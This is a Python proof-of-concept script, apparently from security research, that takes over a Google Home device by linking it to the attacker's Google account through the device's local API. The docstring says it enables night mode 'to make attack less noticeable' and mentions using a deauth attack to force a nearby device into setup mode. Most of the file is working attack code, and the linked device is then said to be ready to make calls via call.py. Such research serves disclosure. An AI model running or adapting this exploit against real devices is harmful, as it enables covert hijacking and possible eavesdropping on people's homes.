"""
usage: link_device.py [--setup_mode] ip_address

Expects a google_creds.pickle (from google_login.py) to be present.

Links the device at the provided IP address to your Google account (and enables
the night mode setting to make attack less noticeable) through the following
process:
1) Connect to device and obtain the unique information (device name, ID, and
certificate) required to link an account.
2) Link the device to your account (requires Internet connection).
3) Get the local auth token required to enable night mode (requires Internet
connection).
4) Connect to device and enable night mode.

If the device to be linked is operating normally and is on the same network as
your computer (with Internet access), these steps can all be completed, one
after another, without issue. --setup_mode specifies that the device to be
linked is not on the same network and is instead in setup mode (broadcasting its
own network). Before running, connect to the device's network. Run the script,
providing "192.168.255.249" as the IP (it always seems to assign itself this).
After connecting to the device and completing step 1, we pause and wait for you
to manually switch to your main network before starting step 2, which requires
Internet. We also pause after step 3, waiting for you to re-connect to the
device's network, before starting step 4, which requires device connection.

You can force a nearby device to enter setup mode using a deauth attack, as
described in the report.

Saves linked device info as linked_device_info.pickle for use with call.py.
"""
import pickle
import sys

import googleapi
import googlehome

GOOGLE_CREDS_FN = 'google_creds.pickle'
DEVICE_INFO_FN = 'linked_device_info.pickle'

# used to reset volume after enabling night mode
RESET_VOLUME = 4

if not (2 <= len(sys.argv) <= 3):
    sys.exit('[-] See usage info at top of file')

if sys.argv[1] == '--setup_mode':
    print('[*] Running in setup mode')
    setup_mode = True
    ip = sys.argv[2]
else:
    print('[*] Running in normal mode')
    setup_mode = False
    ip = sys.argv[1]

try:
    with open(GOOGLE_CREDS_FN, 'rb') as f:
        creds = pickle.load(f)
except FileNotFoundError:
    sys.exit('[-] Run google_login.py first')

print('[*] Connecting to device...')
gh = googlehome.LocalAPI(ip)
device_name, device_id, device_cert = gh.get_device_info()
print(f'[+] Got device info for "{device_name}"')
device_info = googleapi.DeviceInfo(device_name, device_id, device_cert)
with open(DEVICE_INFO_FN, 'wb') as f:
    pickle.dump(device_info, f)
print('[*] Saved to linked_device_info.pickle')
if setup_mode:
    input('[!] Internet connection required for next step. Connect to your main'
          ' network, then press enter\n')
print('[*] Authenticating with device link API...')
l = googleapi.DeviceLinkAPI(creds)
print('[*] Linking device to your account...')
l.link_device(device_info)
print('[+] Successfully linked')
try:
    print('[*] Authenticating with Home Graph API...')
    h = googleapi.HomeGraphAPI(creds)
    print('[*] Getting local auth token...')
    potential_tokens = h.get_local_auth_tokens()
    print('[+] Got token')
    if setup_mode:
        input("[!] Device connection required for next step. Connect to the dev"
              "ice's network, then press enter\n")
    print('[*] Enabling night mode...')
    gh.enable_night_mode(potential_tokens)
except (googleapi.APIError, googlehome.APIError) as e:
    sys.exit(f'[-] Device is linked, but failed to enable night mode: {str(e)}')

msg = ('[+] Success: Device is linked, and night mode is enabled. Ready to '
       'make calls. Note: Enabling night mode set the volume to 0. To reset it '
       'to e.g. 40%, use `reset_volume.py 4`.')
if setup_mode:
    msg += (' BOTH DEVICES must have an Internet connection before either '
            'making calls or resetting volume (stop your deauth attack).')
print(msg)